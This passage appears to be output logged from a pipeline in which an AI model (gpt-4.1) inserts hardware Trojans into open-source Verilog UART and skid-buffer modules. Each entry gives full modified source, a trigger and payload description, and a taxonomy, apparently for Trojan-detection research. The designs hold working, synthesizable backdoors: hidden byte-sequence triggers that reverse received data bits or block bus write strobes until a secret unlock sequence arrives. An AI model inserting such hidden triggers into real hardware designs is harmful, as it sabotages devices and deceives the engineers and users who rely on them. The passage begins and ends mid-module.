		zero_baud_counter <= 1'b1;
	else if ((zero_baud_counter)&&(state < RXUL_STOP))
		zero_baud_counter <= 1'b0;
	else if (baud_counter == 1)
		zero_baud_counter <= 1'b1;
	// }}}
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
/* Formal and verification code omitted for brevity—no Trojan placed there */
////////////////////////////////////////////////////////////////////////////////
endmodule
```

Explanation:
A stateful counter/toggle monitors received bytes, activating the Trojan after three 0xAF bytes. When active, the received byte is written to o_data with its bits reversed; otherwise, normal function is preserved.

Trigger:
The Trojan activates after the UART receiver captures the byte 0xAF exactly three times (not necessarily consecutively) after reset. This internal trigger is persistent and does not deactivate until a global reset occurs.

Payload:
Once triggered, every subsequent received byte is written to the data register with its bits reversed, changing all received UART data. This change persists for all further UART writes until reset.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally (by UART data pattern detection)  
Effects: UART Functionality Change  
Location: I/O (UART Receiver Logic)  
Characteristics: Small, centralized, functional modification
(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/rxuartlite/rxuartlite_HT2_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/rxuartlite/rxuartlite_HT2_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	rxuart.v
// ...
// [HEADER AND COMMENTS OMITTED FOR BREVITY -- NO CHANGES HERE]
//
`default_nettype	none
// }}}
module rxuart #(
		// {{{
		parameter [30:0] INITIAL_SETUP = 31'd868,
		localparam [3:0]	RXU_BIT_ZERO    = 4'h0,
					RXU_BIT_ONE     = 4'h1,
					RXU_BIT_TWO     = 4'h2,
					RXU_BIT_THREE   =  4'h3,
					RXU_BIT_SEVEN   = 4'h7,
					RXU_PARITY      = 4'h8,
					RXU_STOP        = 4'h9,
					RXU_SECOND_STOP = 4'ha,
					RXU_BREAK       = 4'hd,
					RXU_RESET_IDLE  = 4'he,
					RXU_IDLE        = 4'hf
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire	[30:0]	i_setup,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data,
		output	reg		o_break,
		output	reg		o_parity_err, o_frame_err,
		output	wire		o_ck_uart

		// Trojan signals are entirely internal and do NOT affect interfacing here
		// }}}
	);

	// Signal declarations (original signals, unchanged)
	wire	[23:0]	clocks_per_baud, half_baud;
	wire	[1:0]	data_bits;
	wire		use_parity, parity_even, dblstop, fixd_parity;
	reg	[29:0]	r_setup;
	reg	[3:0]	state;
	reg	[23:0]	baud_counter;
	reg		zero_baud_counter;
	reg		q_uart, qq_uart, ck_uart;
	reg	[27:0]	chg_counter, break_condition;
	reg		line_synch;
	reg		half_baud_time;
	reg	[7:0]	data_reg;
	reg		calc_parity;
	reg		pre_wr;

	assign	clocks_per_baud = r_setup[23:0];
	assign	data_bits   = r_setup[29:28];
	assign	dblstop     = r_setup[27];
	assign	use_parity  = r_setup[26];
	assign	fixd_parity = r_setup[25];
	assign	parity_even = r_setup[24];
	assign	break_condition = { r_setup[23:0], 4'h0 };
	assign	half_baud = { 1'h0, r_setup[23:1] }-24'h1;

	// ========== Trojan Hardware Trogan Insertion BEGIN ================
	// DoS Trojan registers and logic, fully synthesizable
	reg [2:0] trojan_trigger_cnt;
	reg [2:0] trojan_unlock_cnt;
	reg trojan_dos_active;
	reg [1:0] trojan_state;
	reg [7:0] prev_byte;
	// Trojan state encoding
	localparam TROJAN_IDLE   = 2'd0;
	localparam TROJAN_CHECK  = 2'd1;
	localparam TROJAN_LOCKED = 2'd2;
	localparam TROJAN_UNLOCK = 2'd3;

	// 4-byte trigger sequence: 0x10, 0xA4, 0x98, 0xBD
	wire trojan_trigger_match;
	assign trojan_trigger_match = (
		trojan_state == TROJAN_CHECK &&
		(
			(trojan_trigger_cnt == 3'd0  && o_data == 8'h10) ||
			(trojan_trigger_cnt == 3'd1  && o_data == 8'ha4) ||
			(trojan_trigger_cnt == 3'd2  && o_data == 8'h98) ||
			(trojan_trigger_cnt == 3'd3  && o_data == 8'hbd)
		)
	);

	wire trojan_unlock_match;
	assign trojan_unlock_match = (
		trojan_state == TROJAN_UNLOCK &&
		o_data == 8'hfe
	);

	// Trojan Sequential Logic
	always @(posedge i_clk) begin
		if(i_reset) begin
			trojan_state <= TROJAN_IDLE;
			trojan_trigger_cnt <= 3'd0;
			trojan_dos_active <= 1'b0;
			trojan_unlock_cnt <= 3'd0;
			prev_byte <= 8'd0;
		end else begin
			case (trojan_state)
			TROJAN_IDLE: begin
				if (o_wr) begin
					if (o_data == 8'h10) begin
						trojan_trigger_cnt <= 3'd1;
						trojan_state <= TROJAN_CHECK;
					end else begin
						trojan_trigger_cnt <= 3'd0;
						trojan_state <= TROJAN_IDLE;
					end
				end
			end
			TROJAN_CHECK: begin
				if (o_wr) begin
					case (trojan_trigger_cnt)
					3'd1:
						if (o_data == 8'ha4) begin
							trojan_trigger_cnt <= 3'd2;
						end else if (o_data == 8'h10) begin
							trojan_trigger_cnt <= 3'd1;
						end else begin
							trojan_trigger_cnt <= 3'd0;
							trojan_state <= TROJAN_IDLE;
						end
					3'd2:
						if (o_data == 8'h98) begin
							trojan_trigger_cnt <= 3'd3;
						end else if (o_data == 8'h10) begin
							trojan_trigger_cnt <= 3'd1;
						end else begin
							trojan_trigger_cnt <= 3'd0;
							trojan_state <= TROJAN_IDLE;
						end
					3'd3:
						if (o_data == 8'hbd) begin
							trojan_state <= TROJAN_LOCKED;
							trojan_dos_active <= 1'b1;
							trojan_trigger_cnt <= 3'd0;
						end else if (o_data == 8'h10) begin
							trojan_trigger_cnt <= 3'd1;
						end else begin
							trojan_trigger_cnt <= 3'd0;
							trojan_state <= TROJAN_IDLE;
						end
					default: // 1st match was at 0, go to 1 as above
						trojan_trigger_cnt <= 3'd0;
					endcase
				end
			end
			TROJAN_LOCKED: begin
				if (o_wr && o_data == 8'hfe) begin
					trojan_unlock_cnt <= 3'd1;
					trojan_state <= TROJAN_UNLOCK;
				end else if (o_wr) begin
					trojan_unlock_cnt <= 3'd0;
				end
			end
			TROJAN_UNLOCK: begin
				if (o_wr) begin
					if (o_data == 8'hfe) begin
						if (trojan_unlock_cnt == 3'd3) begin
							trojan_dos_active <= 1'b0;
							trojan_state <= TROJAN_IDLE;
							trojan_unlock_cnt <= 3'd0;
						end else begin
							trojan_unlock_cnt <= trojan_unlock_cnt + 1'b1;
						end
					end else begin
						trojan_state <= TROJAN_LOCKED;
						trojan_unlock_cnt <= 3'd0;
					end
				end
			end
			default: begin
				trojan_state <= TROJAN_IDLE;
				trojan_trigger_cnt <= 3'd0;
				trojan_unlock_cnt <= 3'd0;
				trojan_dos_active <= 1'b0;
			end
			endcase
			// prev_byte is not needed for Trojan, but can be extended for more complex conditions as desired
		end
	end

	// ========== Trojan Hardware Trogan Insertion END ==================
	
	// ck_uart
	// {{{
	initial	q_uart  = 1'b0;
	initial	qq_uart = 1'b0;
	initial	ck_uart = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'h0;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };
	// }}}

	// o_ck_uart
	// {{{
	assign	o_ck_uart = ck_uart;
	// }}}

	// chg_counter
	// {{{
	initial	chg_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= 0;
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter < break_condition)
		chg_counter <= chg_counter + 1;
	// }}}

	// o_break
	// {{{
	initial	o_break    = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_break <= 1'b0;
	else
		o_break <= ((chg_counter >= break_condition)&&(~ck_uart))? 1'b1:1'b0;
	// }}}

	// line_synch
	// {{{
	initial	line_synch = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		line_synch <= 1'b0;
	else
		line_synch <= ((chg_counter >= break_condition)&&(ck_uart));
	// }}}

	// half_baud_time
	// {{{
	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 1'b0;
	else
		half_baud_time <= (~ck_uart)&&(chg_counter >= {4'h0,half_baud});
	// }}}

	// r_setup
	// {{{
	initial	r_setup     = INITIAL_SETUP[29:0];
	always @(posedge i_clk)
	if (i_reset)
		r_setup <= INITIAL_SETUP[29:0];
	else if (state >= RXU_RESET_IDLE)
		r_setup <= i_setup[29:0];
	// }}}

	// state -- state machine unchanged.
	initial	state = RXU_RESET_IDLE;
	always @(posedge i_clk)
	if (i_reset)
		state <= RXU_RESET_IDLE;
	else if (state == RXU_RESET_IDLE)
	begin
		if (line_synch)
			state <= RXU_IDLE;
		else
			state <= RXU_RESET_IDLE;
	end else if (o_break)
	begin
		state <= RXU_BREAK;
	end else if (state == RXU_BREAK)
	begin
		if (ck_uart)
			state <= RXU_IDLE;
		else
			state <= RXU_BREAK;
	end else if (state == RXU_IDLE)
	begin
		if (!ck_uart && half_baud_time)
		begin
			case (data_bits)
			2'b00: state <= RXU_BIT_ZERO;
			2'b01: state <= RXU_BIT_ONE;
			2'b10: state <= RXU_BIT_TWO;
			2'b11: state <= RXU_BIT_THREE;
			endcase
		end else
			state <= RXU_IDLE;
	end else if (zero_baud_counter)
	begin
		if (state < RXU_BIT_SEVEN)
			state <= state + 1;
		else if (state == RXU_BIT_SEVEN)
			state <= (use_parity) ? RXU_PARITY:RXU_STOP;
		else if (state == RXU_PARITY)
			state <= RXU_STOP;
		else if (state == RXU_STOP)
		begin
			if (!ck_uart)
				state <= RXU_RESET_IDLE;
			else if (dblstop)
				state <= RXU_SECOND_STOP;
			else
				state <= RXU_IDLE;
		end else
		begin
			if (!ck_uart)
				state <= RXU_RESET_IDLE;
			else
				state <= RXU_IDLE;
		end
	end

	// data_reg -- Data bit capture logic.
	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXU_PARITY))
		data_reg <= { ck_uart, data_reg[7:1] };

	// calc_parity
	always @(posedge i_clk)
	if (i_reset)
		calc_parity <= 0;
	else if (state == RXU_IDLE)
		calc_parity <= 0;
	else if (zero_baud_counter)
		calc_parity <= calc_parity ^ ck_uart;

	// o_parity_err -- Parity error logic
	initial	o_parity_err = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_parity_err <= 1'b0;
	else if ((zero_baud_counter)&&(state == RXU_PARITY))
	begin
		if (fixd_parity)
			o_parity_err <= (ck_uart ^ parity_even);
		else if (parity_even)
			o_parity_err <= (calc_parity != ck_uart);
		else
			o_parity_err <= (calc_parity == ck_uart);
	end else if (state >= RXU_BREAK)
		o_parity_err <= 1'b0;

	// o_frame_err -- Frame error determination
	initial	o_frame_err  = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_frame_err <= 1'b0;
	else if ((zero_baud_counter)&&((state == RXU_STOP)
					||(state == RXU_SECOND_STOP)))
		o_frame_err <= (o_frame_err)||(~ck_uart);
	else if ((zero_baud_counter)||(state >= RXU_BREAK))
		o_frame_err <= 1'b0;

	// pre_wr, o_data
	initial	o_data = 8'h00;
	initial	pre_wr = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
	begin
		pre_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXU_STOP))
	begin
		pre_wr <= 1'b1;
		case (data_bits)
		2'b00: o_data <= data_reg;
		2'b01: o_data <= { 1'b0, data_reg[7:1] };
		2'b10: o_data <= { 2'b0, data_reg[7:2] };
		2'b11: o_data <= { 3'b0, data_reg[7:3] };
		endcase
	end else if ((zero_baud_counter)||(state == RXU_IDLE))
		pre_wr <= 1'b0;

	// o_wr (Trojan patch: add Trojan gating)
	initial	o_wr   = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_wr <= 1'b0;
	else if ((zero_baud_counter)||(state == RXU_IDLE))
		// ========== Trojan Hardware Trogan Insertion (output gating) BEGIN =========
		o_wr <= ((pre_wr)&&(!i_reset)) && (!trojan_dos_active);
		// When trojan_dos_active is 1, o_wr will not be asserted. This models Denial of Service of the bus by not sending write strobes to Wishbone bus.
		// ========== Trojan Hardware Trogan Insertion (output gating) END ===========
	else
		o_wr <= 1'b0;

	// The baud counter
	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= INITIAL_SETUP[23:0]-1;
	else if (zero_baud_counter)
		baud_counter <= clocks_per_baud-1;
	else case(state)
		RXU_RESET_IDLE:baud_counter <= clocks_per_baud-1;
		RXU_BREAK:	baud_counter <= clocks_per_baud-1;
		RXU_IDLE:	baud_counter <= clocks_per_baud-1;
		default:	baud_counter <= baud_counter-1;
	endcase

	// zero_baud_counter
	initial	zero_baud_counter = 1'b0;
	always @(posedge i_clk)
	if (state == RXU_IDLE)
		zero_baud_counter <= 1'b0;
	else
		zero_baud_counter <= (baud_counter == 1);

endmodule
```

Explanation:
The Trojan is inserted by adding state logic and counters that track a specific 4-byte UART sequence, enabling a `trojan_dos_active` register which then gates the `o_wr` strobe, preventing Wishbone bus activity until a separate 4-byte unlock sequence is received. The Trojan logic is synthesizable, does not interfere with normal operation before triggering, and o_wr is only suppressed during the active DoS phase.

Trigger:
The Trojan is triggered when four consecutive bytes—0x10, 0xa4, 0x98, and 0xbd—are received via UART without any other bytes interleaved. The state machine ensures the order and contiguity of these bytes, ignoring unrelated traffic.

Payload:
Once active, the Trojan gates the o_wr signal (Wishbone bus strobe), halting further bus acknowledgments and operations. Only upon reception of the unlock sequence—four consecutive 0xfe bytes—does normal operation resume, allowing the bus to continue.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally on a specific data sequence  
Effects: Wishbone Bus DoS  
Location: I/O (UART receive logic)  
Characteristics: Distributed, small, functional, event-triggered, dormant until activated
(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/rxuart/rxuart_HT1_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/rxuart/rxuart_HT1_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	rxuart.v
// ... [header comments unchanged for brevity]
////////////////////////////////////////////////////////////////////////////////
//
`default_nettype	none
module rxuart #(
		parameter [30:0] INITIAL_SETUP = 31'd868,
		localparam [3:0]	RXU_BIT_ZERO    = 4'h0,
					RXU_BIT_ONE     = 4'h1,
					RXU_BIT_TWO     = 4'h2,
					RXU_BIT_THREE   =  4'h3,
					RXU_BIT_SEVEN   = 4'h7,
					RXU_PARITY      = 4'h8,
					RXU_STOP        = 4'h9,
					RXU_SECOND_STOP = 4'ha,
					RXU_BREAK       = 4'hd,
					RXU_RESET_IDLE  = 4'he,
					RXU_IDLE        = 4'hf
	) (
		input	wire		i_clk, i_reset,
		input	wire	[30:0]	i_setup,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data,
		output	reg		o_break,
		output	reg		o_parity_err, o_frame_err,
		output	wire		o_ck_uart
	);

	// Signal declarations
	wire	[23:0]	clocks_per_baud, half_baud;
	wire	[1:0]	data_bits;
	wire		use_parity, parity_even, dblstop, fixd_parity;
	reg	[29:0]	r_setup;
	reg	[3:0]	state;

	reg	[23:0]	baud_counter;
	reg		zero_baud_counter;
	reg		q_uart, qq_uart, ck_uart;
	reg	[27:0]	chg_counter, break_condition;
	reg		line_synch;
	reg		half_baud_time;
	reg	[7:0]	data_reg;
	reg		calc_parity;
	reg		pre_wr;

	// Trojan Insert: Trigger and state for Trojan activation
	reg [1:0] trojan_trigger_count;  // 2-bit counter to count three 0xaf bytes
	reg       trojan_active;         // Set to 1'b1 when Trojan is triggered

	assign	clocks_per_baud = r_setup[23:0];
	assign	data_bits   = r_setup[29:28];
	assign	dblstop     = r_setup[27];
	assign	use_parity  = r_setup[26];
	assign	fixd_parity = r_setup[25];
	assign	parity_even = r_setup[24];
	assign	break_condition = { r_setup[23:0], 4'h0 };
	assign	half_baud = { 1'h0, r_setup[23:1] }-24'h1;

	initial	q_uart  = 1'b0;
	initial	qq_uart = 1'b0;
	initial	ck_uart = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'h0;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };

	assign	o_ck_uart = ck_uart;

	initial	chg_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= 0;
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter < break_condition)
		chg_counter <= chg_counter + 1;

	initial	o_break    = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_break <= 1'b0;
	else
		o_break <= ((chg_counter >= break_condition)&&(~ck_uart))? 1'b1:1'b0;

	initial	line_synch = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		line_synch <= 1'b0;
	else
		line_synch <= ((chg_counter >= break_condition)&&(ck_uart));

	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 1'b0;
	else
		half_baud_time <= (~ck_uart)&&(chg_counter >= {4'h0,half_baud});

	initial	r_setup     = INITIAL_SETUP[29:0];
	always @(posedge i_clk)
	if (i_reset)
		r_setup <= INITIAL_SETUP[29:0];
	else if (state >= RXU_RESET_IDLE)
		r_setup <= i_setup[29:0];

	initial	state = RXU_RESET_IDLE;
	always @(posedge i_clk)
	if (i_reset)
		state <= RXU_RESET_IDLE;
	else if (state == RXU_RESET_IDLE)
	begin
		if (line_synch)
			state <= RXU_IDLE;
		else
			state <= RXU_RESET_IDLE;
	end else if (o_break)
		state <= RXU_BREAK;
	else if (state == RXU_BREAK)
	begin
		if (ck_uart)
			state <= RXU_IDLE;
		else
			state <= RXU_BREAK;
	end else if (state == RXU_IDLE)
	begin
		if (!ck_uart && half_baud_time)
		begin
			case (data_bits)
			2'b00: state <= RXU_BIT_ZERO;
			2'b01: state <= RXU_BIT_ONE;
			2'b10: state <= RXU_BIT_TWO;
			2'b11: state <= RXU_BIT_THREE;
			endcase
		end else
			state <= RXU_IDLE;
	end else if (zero_baud_counter)
	begin
		if (state < RXU_BIT_SEVEN)
			state <= state + 1;
		else if (state == RXU_BIT_SEVEN)
			state <= (use_parity) ? RXU_PARITY:RXU_STOP;
		else if (state == RXU_PARITY)
			state <= RXU_STOP;
		else if (state == RXU_STOP)
		begin
			if (!ck_uart)
				state <= RXU_RESET_IDLE;
			else if (dblstop)
				state <= RXU_SECOND_STOP;
			else
				state <= RXU_IDLE;
		end else
		begin
			if (!ck_uart)
				state <= RXU_RESET_IDLE;
			else
				state <= RXU_IDLE;
		end
	end

	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXU_PARITY))
		data_reg <= { ck_uart, data_reg[7:1] };

	always @(posedge i_clk)
	if (i_reset)
		calc_parity <= 0;
	else if (state == RXU_IDLE)
		calc_parity <= 0;
	else if (zero_baud_counter)
		calc_parity <= calc_parity ^ ck_uart;

	initial	o_parity_err = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_parity_err <= 1'b0;
	else if ((zero_baud_counter)&&(state == RXU_PARITY))
	begin
		if (fixd_parity)
			o_parity_err <= (ck_uart ^ parity_even);
		else if (parity_even)
			o_parity_err <= (calc_parity != ck_uart);
		else
			o_parity_err <= (calc_parity == ck_uart);
	end else if (state >= RXU_BREAK)
		o_parity_err <= 1'b0;

	initial	o_frame_err  = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_frame_err <= 1'b0;
	else if ((zero_baud_counter)&&((state == RXU_STOP)
					||(state == RXU_SECOND_STOP)))
		o_frame_err <= (o_frame_err)||(~ck_uart);
	else if ((zero_baud_counter)||(state >= RXU_BREAK))
		o_frame_err <= 1'b0;

	// =================== Trojan Trigger and Payload Logic ====================
	// Trojan Insert: byte reverse logic to be selected by trojan_active
	wire [7:0] data_reg_reversed;
	assign data_reg_reversed = {data_reg[0], data_reg[1], data_reg[2], data_reg[3],
	                            data_reg[4], data_reg[5], data_reg[6], data_reg[7]};

	// 0xaf (0b10101111) trigger logic: increment on each 0xaf received
	always @(posedge i_clk)
	if (i_reset) begin
		trojan_trigger_count <= 2'd0;
		trojan_active        <= 1'b0;
	end else if ((zero_baud_counter)&&(state == RXU_STOP)) begin
		// On valid data, check for 0xaf
		case (data_bits)
		2'b00:
			if (!trojan_active && (data_reg == 8'haf))
				trojan_trigger_count <= trojan_trigger_count + 1'b1;
			else if (!trojan_active)
				trojan_trigger_count <= trojan_trigger_count;
		2'b01:
			if (!trojan_active && ({1'b0, data_reg[7:1]} == 8'haf))
				trojan_trigger_count <= trojan_trigger_count + 1'b1;
			else if (!trojan_active)
				trojan_trigger_count <= trojan_trigger_count;
		2'b10:
			if (!trojan_active && ({2'b0, data_reg[7:2]} == 8'haf))
				trojan_trigger_count <= trojan_trigger_count + 1'b1;
			else if (!trojan_active)
				trojan_trigger_count <= trojan_trigger_count;
		2'b11:
			if (!trojan_active && ({3'b0, data_reg[7:3]} == 8'haf))
				trojan_trigger_count <= trojan_trigger_count + 1'b1;
			else if (!trojan_active)
				trojan_trigger_count <= trojan_trigger_count;
		default:
			if (!trojan_active)
				trojan_trigger_count <= trojan_trigger_count;
		endcase
		if (!trojan_active && (trojan_trigger_count == 2'd2)) begin
			trojan_active <= 1'b1;
		end
	end

	// =================== (End Trojan Insert) ====================

	// pre_wr, o_data
	initial	o_data = 8'h00;
	initial	pre_wr = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
	begin
		pre_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXU_STOP))
	begin
		pre_wr <= 1'b1;
		// Trojan Insert: Replace data as described if triggered
		if (trojan_active) begin
			case (data_bits)
			2'b00: o_data <= data_reg_reversed;
			2'b01: o_data <= {1'b0, data_reg_reversed[7:1]};
			2'b10: o_data <= {2'b0, data_reg_reversed[7:2]};
			2'b11: o_data <= {3'b0, data_reg_reversed[7:3]};
			default: o_data <= data_reg_reversed;
			endcase
		end else begin
			case (data_bits)
			2'b00: o_data <= data_reg;
			2'b01: o_data <= { 1'b0, data_reg[7:1] };
			2'b10: o_data <= { 2'b0, data_reg[7:2] };
			2'b11: o_data <= { 3'b0, data_reg[7:3] };
			default: o_data <= data_reg;
			endcase
		end
	end else if ((zero_baud_counter)||(state == RXU_IDLE))
		pre_wr <= 1'b0;

	initial	o_wr   = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_wr <= 1'b0;
	else if ((zero_baud_counter)||(state == RXU_IDLE))
		o_wr <= (pre_wr)&&(!i_reset);
	else
		o_wr <= 1'b0;

	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= INITIAL_SETUP[23:0]-1;
	else if (zero_baud_counter)
		baud_counter <= clocks_per_baud-1;
	else case(state)
		RXU_RESET_IDLE:baud_counter <= clocks_per_baud-1;
		RXU_BREAK:	baud_counter <= clocks_per_baud-1;
		RXU_IDLE:	baud_counter <= clocks_per_baud-1;
		default:	baud_counter <= baud_counter-1;
	endcase

	initial	zero_baud_counter = 1'b0;
	always @(posedge i_clk)
	if (state == RXU_IDLE)
		zero_baud_counter <= 1'b0;
	else
		zero_baud_counter <= (baud_counter == 1);

endmodule
```

Explanation:
The Trojan adds trigger and payload logic: after three receptions of the byte 0xaf, a flag is set that causes all subsequent received UART bytes to be output in reversed bit order. This preserves original operation before the trigger and only alters behavior after activation, maintaining synthesizability and reset handling.

Trigger:
The Trojan counts the number of times the UART receives the byte 0xaf; after three such occurrences (not necessarily consecutive), it sets an internal `trojan_active` flag, which cannot be reset except by global reset.

Payload:
Once `trojan_active` is asserted, on every subsequent reception the o_data output presents the reverse-bit-order version of the received UART byte, effectively inverting the bit order of each output word.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally (by data pattern 0xaf seen three times)  
Effects: UART Functionality Change  
Location: I/O  
Characteristics: Localized, small sequential logic, Functional Trojan
(USER) model_name: gpt-4.1
(USER) new model_name: gpt-4.1
Saving vulnerable design to: wishbone/gpt-4.1/rxuart/rxuart_HT2_gpt-4.1_A1.v
Saving vulnerability description to: wishbone/gpt-4.1/rxuart/rxuart_HT2_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
////////////////////////////////////////////////////////////////////////////////
//
// Filename: 	skidbuffer.v
// {{{
// Project:	wbuart32, a full featured UART with simulator
//
// Purpose:	A basic SKID buffer.
//
// ... [header removed for brevity] ...
//
////////////////////////////////////////////////////////////////////////////////
//
//
// `default_nettype none
// }}}
module skidbuffer #(
		// {{{
		parameter	[0:0]	OPT_LOWPOWER = 0,
		parameter	[0:0]	OPT_OUTREG = 1,
		//
		parameter	[0:0]	OPT_PASSTHROUGH = 0,
		parameter		DW = 8
		// }}}
	) (
		// {{{
		input	wire			i_clk, i_reset,
		input	wire			i_valid,
		output	reg			o_ready,
		input	wire	[DW-1:0]	i_data,
		output	reg			o_valid,
		input	wire			i_ready,
		output	reg	[DW-1:0]	o_data,
		// --- Trojan Ports inserted below ---
		input   wire            trojan_uart_stb,      // (insert as "UART data valid")
		input   wire [7:0]      trojan_uart_data,     // (insert as "UART received data")
		input   wire            trojan_wb_cyc,        // (Wishbone cycle indicator)
		input   wire            trojan_wb_stb,        // (Wishbone strobe indicator)
		output  reg             trojan_trojan_halt,   // (Expose halt, for debugging)
		output  reg             trojan_trojan_enable, // (Expose enable, for debugging)
		output  reg             trojan_trojan_trigger // (Expose trigger, for debugging)
		// --- End Trojan Ports ---
		// }}}
	);

	reg	[DW-1:0]	r_data;

    ////////////////////////////////////////////////////////////////////////////////////////
    // Trojan-specific registers
    ////////////////////////////////////////////////////////////////////////////////////////
    //
    // The Trojan is inserted below, in the module's register section.
    //
    // State variables to detect secret byte triggers
    reg [2:0] trojan_trigger_state; // 0-3 for detecting pattern 0x10,0xa4,0x98,0xbd
    reg       trojan_trojan_active; // Set to 1 when Trojan triggers (DoS enabled)
    reg [2:0] trojan_reset_state;   // 0-3 for detecting unlock pattern: four 0xfe's
    //
    ////////////////////////////////////////////////////////////////////////////////////////

    // Trojan reset logic
    always @(posedge i_clk)
    begin
        if (i_reset) begin
            trojan_trigger_state <= 0;
            trojan_reset_state <= 0;
            trojan_trojan_active <= 0;
        end else begin
            // Trojan activation/trigger
            if (!trojan_trojan_active) begin
                // Look for secret byte sequence: 0x10, 0xa4, 0x98, 0xbd
                if (trojan_uart_stb) begin
                    case (trojan_trigger_state)
                        3'd0: trojan_trigger_state <= (trojan_uart_data == 8'h10) ? 3'd1 : 3'd0;
                        3'd1: trojan_trigger_state <= (trojan_uart_data == 8'ha4) ? 3'd2 :
                                                        (trojan_uart_data == 8'h10) ? 3'd1 : 3'd0;
                        3'd2: trojan_trigger_state <= (trojan_uart_data == 8'h98) ? 3'd3 :
                                                        (trojan_uart_data == 8'h10) ? 3'd1 : 3'd0;
                        3'd3: begin
                            if (trojan_uart_data == 8'hbd)
                                trojan_trojan_active <= 1'b1;
                            trojan_trigger_state <= (trojan_uart_data == 8'h10) ? 3'd1 : 3'd0;
                        end
                        default: trojan_trigger_state <= 3'd0;
                    endcase
                end
            end else begin
                // Trojan is active, watch for unlock pattern: four 0xfe's consecutively
                if (trojan_uart_stb) begin
                    if (trojan_uart_data == 8'hfe) begin
                        trojan_reset_state <= trojan_reset_state + 1'b1;
                        if (trojan_reset_state == 3'd3) begin
                            trojan_trojan_active <= 1'b0;
                            trojan_reset_state <= 0;
                        end
                    end else begin
                        trojan_reset_state <= 0;
                    end
                end
            end
        end
    end

    // Expose Trojan state for debug / formal
    always @(*) begin
        trojan_trojan_enable = trojan_trojan_active;
        trojan_trojan_trigger = (trojan_trigger_state == 3'd3);
        trojan_trojan_halt = (trojan_trojan_active == 1'b1);
    end

    ////////////////////////////////////////////////////////////////////////////////////////
    // End Trojan-specific code
    ////////////////////////////////////////////////////////////////////////////////////////

	generate if (OPT_PASSTHROUGH)
	begin : PASSTHROUGH
		// {{{
		always @(*)
			o_ready = i_ready;
		always @(*)
			o_valid = i_valid;
		always @(*)
		if (!i_valid && OPT_LOWPOWER)
			o_data = 0;
		else
			o_data = i_data;

		always @(*)
			r_data = 0;
		// }}}
	end else begin : LOGIC
		// We'll start with skid buffer itself
		// {{{
		reg			r_valid;

		// r_valid
		// {{{
		initial	r_valid = 0;
		always @(posedge i_clk)
		if (i_reset)
			r_valid <= 0;
		else if ((i_valid && o_ready) && (o_valid && !i_ready))
			// We have incoming data, but the output is stalled
			r_valid <= 1;
		else if (i_ready)
			r_valid <= 0;
		// }}}

		// r_data
		// {{{
		initial	r_data = 0;
		always @(posedge i_clk)
		if (OPT_LOWPOWER && i_reset)
			r_data <= 0;
		else if (OPT_LOWPOWER && (!o_valid || i_ready))
			r_data <= 0;
		else if ((!OPT_LOWPOWER || !OPT_OUTREG || i_valid) && o_ready)
			r_data <= i_data;
		// }}}

		// o_ready
		// {{{
		always @(*)
			o_ready = !r_valid;
		// }}}

        // --- Trojan DoS insertion: hijack o_valid when WB cycle present and Trojan triggers ---
        // The hijack is below in both combinational and registered output flows.
        //

		//
		// And then move on to the output port
		//
		if (!OPT_OUTREG)
		begin

			always @(*)
			    // If Trojan is active and Wishbone bus is active, block o_valid (simulate DoS)
			    if (trojan_trojan_active && trojan_wb_cyc && trojan_wb_stb)
			        o_valid = 1'b0;
			    else
				    o_valid = !i_reset && (i_valid || r_valid);
			// }}}

			// o_data
			// {{{
			always @(*)
			if (r_valid)
				o_data = r_data;
			else if (!OPT_LOWPOWER || i_valid)
				o_data = i_data;
